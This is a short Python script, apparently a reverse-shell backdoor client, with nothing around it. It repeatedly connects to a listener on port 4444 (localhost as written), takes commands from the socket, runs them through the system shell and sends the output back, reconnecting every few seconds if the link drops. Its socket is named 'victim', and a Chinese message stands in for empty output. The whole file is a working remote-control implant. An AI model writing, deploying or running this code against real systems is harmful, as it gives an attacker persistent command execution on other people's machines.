import socket
import subprocess
import time

while True:
    try:
        victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim.connect(('127.0.0.1', 4444))
        
        while True:
            cmd = victim.recv(4096).decode()
            if cmd.lower() == 'exit':
                victim.close()
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if output == '':
                output = '命令执行完成（无输出）'
            victim.send(output.encode())
    except:
        time.sleep(5)